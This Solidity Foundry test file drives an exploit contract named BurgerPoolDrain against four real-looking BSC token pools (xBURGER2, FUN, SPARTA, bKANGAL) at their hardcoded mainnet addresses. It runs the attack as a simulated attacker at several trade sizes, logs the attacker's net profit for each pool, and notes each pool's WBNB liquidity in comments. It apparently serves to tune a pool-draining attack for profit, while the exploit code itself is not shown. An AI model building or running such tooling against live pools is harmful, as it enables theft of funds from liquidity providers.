// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerPoolDrain.sol";

contract BurgerPoolTest6 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant xBURGER2 = 0xAFE24E29Da7E9b3e8a25c9478376B6AD6AD788dD;
    address constant FUN = 0xCC89AC2C6f4a82e5A4c53215b6a6d7ebA4C25E6a;
    address constant SPARTA = 0xE4Ae305ebE1AbE663f261Bc00534067C80ad677C;
    address constant bKANGAL = 0xd632Bd021a07AF70592CE1E18717Ab9aA126DECB;

    function _testPool(
        address token, uint256 buyWbnb, uint256 pairPct, uint256 fundBnb
    ) internal returns (int256) {
        address att = makeAddr("attacker");
        vm.deal(att, fundBnb);
        vm.startPrank(att);

        uint256 bef = att.balance;
        BurgerPoolDrain e = new BurgerPoolDrain();

        try e.attack{value: fundBnb - 1 ether}(token, buyWbnb, 0, pairPct) {
            vm.stopPrank();
            return int256(att.balance) - int256(bef);
        } catch {
            vm.stopPrank();
            return type(int256).min;
        }
    }

    // xBURGER2: 383.6 WBNB pool
    function test_xburger2_700() public {
        int256 d = _testPool(xBURGER2, 700 ether, 50, 1000 ether);
        emit log_named_int("xBURGER2 700", d);
    }

    function test_xburger2_1000() public {
        int256 d = _testPool(xBURGER2, 1000 ether, 50, 1500 ether);
        emit log_named_int("xBURGER2 1000", d);
    }

    function test_xburger2_1300() public {
        int256 d = _testPool(xBURGER2, 1300 ether, 50, 1800 ether);
        emit log_named_int("xBURGER2 1300", d);
    }

    // FUN: 58.3 WBNB pool
    function test_fun_150() public {
        int256 d = _testPool(FUN, 150 ether, 50, 250 ether);
        emit log_named_int("FUN 150", d);
    }

    function test_fun_200() public {
        int256 d = _testPool(FUN, 200 ether, 50, 300 ether);
        emit log_named_int("FUN 200", d);
    }

    // SPARTA: 33.9 WBNB pool
    function test_sparta_100() public {
        int256 d = _testPool(SPARTA, 100 ether, 50, 200 ether);
        emit log_named_int("SPARTA 100", d);
    }

    // bKANGAL: 32.7 WBNB pool
    function test_bkangal_100() public {
        int256 d = _testPool(bKANGAL, 100 ether, 50, 200 ether);
        emit log_named_int("bKANGAL 100", d);
    }
}
